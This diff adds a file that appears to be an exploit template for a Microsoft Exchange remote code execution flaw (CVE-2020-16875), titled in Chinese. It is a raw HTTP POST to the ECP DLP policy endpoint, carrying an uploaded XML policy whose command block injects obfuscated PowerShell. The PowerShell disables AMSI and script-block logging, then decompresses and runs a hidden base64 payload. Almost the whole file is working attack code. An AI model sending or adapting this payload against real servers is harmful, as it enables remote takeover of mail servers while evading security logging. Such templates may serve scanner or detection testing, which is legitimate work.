@@ -1,0 +1,45 @@
+# Microsoft Exchange 远程代码执行漏洞(CVE-2020-16875)
+POST /ecp/DLPPolicy/ManagePolicyFromISV.aspx?_ZQA_ID={ZQA_ID} HTTP/1.1
+Host: www.xwd_test.com
+Content-Type: multipart/form-data; boundary=---------------------------891609554822674045647500394429
+Content-Length: 5694
+
+-----------------------------891609554822674045647500394429
+Content-Disposition: form-data; name=""__VIEWSTATE""
+
+1
+-----------------------------891609554822674045647500394429
+Content-Disposition: form-data; name=""ctl00$ResultPanePlaceHolder$senderBtn""
+
+ResultPanePlaceHolder_ButtonsPanel_btnNext
+-----------------------------891609554822674045647500394429
+Content-Disposition: form-data; name=""ctl00$ResultPanePlaceHolder$contentContainer$name""
+
+Bartell-Block Data
+-----------------------------891609554822674045647500394429
+Content-Disposition: form-data; name=""ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl""; filename=""6zevoQWaj4Ypzk53.xml""
+Content-Type: text/xml
+
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<dlpPolicyTemplates>
+  <dlpPolicyTemplate id=""F7C29AEC-A52D-4502-9670-141424A83FAB"" mode=""Audit"" state=""Enabled"" version=""15.0.2.0"">
+    <contentVersion>4</contentVersion>
+    <publisherName>Kozey, Torphy and Waelchi</publisherName>
+    <name>
+      <localizedString lang=""en"">Bartell-Block Data</localizedString>
+    </name>
+    <description>
+      <localizedString lang=""en"">If we copy the circuit, we can get to the FTP driver through the primary SMTP capacitor!</localizedString>
+    </description>
+    <keywords></keywords>
+    <ruleParameters></ruleParameters>
+    <policyCommands>
+      <commandBlock>
+        <![CDATA[ & ""Invoke-Expression"" "" $k8V=[Collections.Generic.Dictionary[string,System.Object]]::new(); $uWbH=(('En'+'a{0}'+'l'+'e{3}cri{1}tBlo'+'ck'+'{2}n{4}o'+'cation'+'{5}ogging')-f'b','p','I','S','v','L');If($PSVersionTable.PSVersion.Major -ge 3){ $wj7=[Ref].Assembly.GetType((('{1}{0}{9}tem'+'.{3}a'+'na'+'{'+'4}em'+'e'+'n'+'t.{'+'8}'+'{5'+'}t'+'{'+'7'+'}ma'+'ti'+'{'+'7'+'}n.{8}'+'m{9}i{2}t'+'i{6}'+'{9}')-f'y','S','U','M','g','u','l','o','A','s')); $zL=[Ref].Assembly.GetType((('{1}'+'y'+'stem'+'.{3}an'+'a{5}eme'+'nt.{2'+'}{0}'+'tomation.Uti{4}s')-f'u','S','A','M','l','g')); $hXtsk=((''+'En'+'{0}bl{1}Script{3}lock{'+'2}o'+'ggin'+'g')-f'a','e','L','B'); $sD=(('Sc'+'ri{2}{1'+'}Bloc{0}Loggin'+'g'+'')-f'k','t','p'); $l6ks=$zL.GetField('cachedGroupPolicySettings','NonPublic,Static'); if ($wj7) { $wj7.GetField(((''+'am{3}i{4}{0'+'}it'+'F'+'ai'+'{1'+'}'+'e{2}'+'')-f'n','l','d','s','I'),'NonPublic,Static').SetValue($null,$true); }; If ($l6ks) { $hn=$l6ks.GetValue($null); If($hn[$sD]){ $hn[$sD][$hXtsk]=0; $hn[$sD][$uWbH]=0; } $k8V.Add($uWbH,0); $k8V.Add($hXtsk,0); $hn['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$sD]=$k8V; } Else { [Ref].Assembly.GetType((('S'+'y{3}tem.Mana{5}ement.{4}'+'{1'+'}'+'toma'+'ti'+'o'+'n'+'.Script{2}{0}ock')-f'l','u','B','s','A','g')).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4s{2}AO2xn2UCA7{1}X/W+qSBf+fZP9H8jGR'+'My1Cmp725vcZAFBYdWKCPixZkNhxNEB'+'LAx{1}u+/+7+8ZlLY3t3f37iZ3ElNm5nzNc54zZ7rOY5/iJOb8k/7M/fnzT9xljL3Uizi+ks7dwKxzlXhRe92sHD9ynzl'+'+Ke333STycLz69EnJ0xTF9Dxv9BC{1}sgxFDwSjjK9x/+PcDUrR1f3DFvmU+5Or/NHokeTB{2}xexk+L5G8RdSXHA9gaJ77G4GtaeYMpXf/+'+'9WlteiauG+ph7JOOr1imjKGoEhFRr3F815nB62iO+OsR+mmTJmjZcHLdbDTvOvDUagbUnNER0kwRZFY7yepgU0TyN2ZmYkbM{2}X'+'4XPcZr4UhCkKMuqdW7JzC9Xq1/55cX3J{2}8pjlBDjylKk72F0ifso6zR9+KAoAlar0DLoimOw1WtBmJPyQ7xlTgn'+'pM79GzP8CB1K5L5XiX+rBFJjmtbqkM+vTjlMgpygs171nTDPDKjBOLMAsPuLwbcumbMdqu8Q53WhHMtiB0G8/DjJc'+'KH7mRPq3BB8ezRJTzCtTNMc1{1}YvaHO{1}3azzXP9ea2KpCoonTwtgaekkOFi9Gvgi9xWvz0S+zeMuWuMYdU+xF2G/pCr/XkLQmqACkEYpNoL4+OplAw{1}dRF'+'DoUQYy48{1}XamqE6YuunGMSoFTy{2}akZRAX5rn0ZzDlvfFWPhygC8M5z{2}GplDQWCSulLUZxK72wOQlWFeFlW58Y5'+'{1}Khf5yzkERTUOSnO8G{1}LymlSfFZfwx3m'+'hGLfy2hpblX7AsyLUyWJM5rmPiQ{1}AJhae+RjjzA86lwfB0g+WTgsn{1}ffRUPxC{2}HCAUtPkA1YYShYlFElhTgLWtQaFqJ6'+'t'+'CcoApnivtC{2}F8LtcCmPgltei{2}Lqu2GW{1}XCmPEOlhONNkJBqiyS0zjk4pXD3M{2}QZtf5T'+'DF/fOhCMkqJLYviyuJbyiTL6{1}/AT4+cFngKMlA{2}QWppEspehm875fuF/aaq4ez3uJs8SDFWbm{2}5s2X'+'Z4FCJHx6{2}RWjq1eioe2Fh24ftkq+GYCvvfptO+YXX7Uto9btaSnulqXz6Zoi'+'z5ffzRMWTbZjrK'+'wNwedSmQo3AWzpWDPt7MdHCkDE{2}9hL+yvvFlYSGEsqBaA1ORDSlQBpa8MTviYjT0id68JTJ+tnRL6ruFvxc/aqfTnx2n'+'0mhoSBvtPtDElrZRsSDtLLNvLna9Q{1}ct5j6bm/NMxSrzo81NZ4NcZy+7qrYwnb0efjiEpjNodrSN'+'DOs6Pg72{1}hOGKOrDgE6th+u2517vHyJHA{2}wAh3hj+Wtl2vcjudl0bH'+'GkY6'+'RN3Z1w'+'PKjC8eSMQCe5ce{2}oZrBK46Zz{2}7HzSofB{1}sqHSucgaeDH14zjbfcjQ4ThCXYeJXFkQD0a8e28UG3ezRJ0YJDdbZzWaDEUDsLEXuxnLUoDJ1gsRM11okn7wb0jC4F0R/aO3veocu/cxaOd2J8{2}YXsh3HXm9oRYjhyNhDt3qBrOwLlto/5ihiLjemg73XnrKM7be8/c+i13JhO7JRLw1fbdQLTs663nhNcPxNDdeHKctUzR3coHpztsu7tE8HtB78GZKJKKjYMz8gBflrupNQil4SNWi4No8tQW4v4hp85g+9QUbWwco+S3mYCNWzdZu8'+'R{2}wu4QOBgZn{1}6img4x8tjpxUmJgwM2ZcAY5G3A2L7gDHkYmPM5gjwAl8S+sO0f5uEUuGXku+lhhKRSH7h0J0h5/nij2Yx7U9fdS+4uMgTgrKpCbJJ'+'kFnoE7+wP9oveTgQ/ehzD7wg/D3xCPqQi1g92dKPuPaNTpLfLztU9Kop26FunRZL1gbddFpdAtl23l0iuDX6eFDEhD03R/Pz5FyjdpY1j2m6tKvFA0FljEX7+qeLd3MlvavhbjXvopdnG{2}1Db0JPL21{1}LUu3SZscJZho8XzzUdiiNEYHXDbx/yotJ{2}iTxWY9n'+'DRmeF+emz94gtl6E9d5XjXsRrL02/3Lp06cFBAk3HX5qDFAc0k1dOLYFAZq2cBQ6xYX2/QdTkv2JB1N11vQLXM6WSWEZjOE1x/M/Hih411HoMt+E6luogesddA{1}oUue7mmEnJwl5i9zlWC9MeAUOEBPh3Ev2oDsTBAxcoUeuQtmT5+0TqvK8EX4sZS4tZwN/gn+gzOva3+x+F42E+hmdr5a/XHjTqn8gAq6HKUha0DwJOj/l3gXiUiZvMgzJgSpYXwb71+Y+p1cjeC4Xzfv/jatje1{2}NAAA{0}')-f'=','V','I')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))""; New-TransportRule -DlpPolicy ]]>
+      </commandBlock>
+    </policyCommands>
+    <policyCommandsResources></policyCommandsResources>
+  </dlpPolicyTemplate>
+</dlpPolicyTemplates>
+
+-----------------------------891609554822674045647500394429--
